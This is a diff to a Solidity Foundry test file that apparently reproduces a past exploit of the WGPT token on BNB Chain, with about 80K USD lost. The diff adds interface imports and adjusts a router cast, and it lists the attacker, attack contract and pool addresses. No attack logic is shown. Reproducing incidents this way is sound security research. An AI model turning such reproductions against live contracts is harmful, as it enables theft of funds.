@@ -3,6 +3,12 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IDPPOracle} from "src/interfaces/IDPPOracle.sol";
+import {IUniswapV3Pair} from "src/interfaces/IUniswapV3Pair.sol";
 // @KeyInfo - Total Lost : ~80K USD$
 // Attacker : https://bscscan.com/address/0xdc459596aed13b9a52fb31e20176a7d430be8b94
 // Attack Contract : https://bscscan.com/address/0x5336a15f27b74f62cc182388c005df419ffb58b8
@@ -29,7 +35,7 @@ contract WGPTTest is Test {
     // Token created by the exploiter
     IERC20 private constant ExpToken = IERC20(0xe1272a840F574b68dE861eC5009784e3411cb96c);
     IWGPT private constant WGPT = IWGPT(0x1f415255f7E2a8546559a553E962dE7BC60d7942);
-    IUniswapV2Router private constant Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router private constant Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     // Pancake Pair created by the exploiter
     IUniswapV2Pair private constant BUSDT_ExpToken = IUniswapV2Pair(0xaa07222e4c3295C4E881ac8640Fbe5fB921D6840);
     IUniswapV2Pair private constant WGPT_BUSDT = IUniswapV2Pair(0x5a596eAE0010E16ed3B021FC09BbF0b7f1B2d3cD);
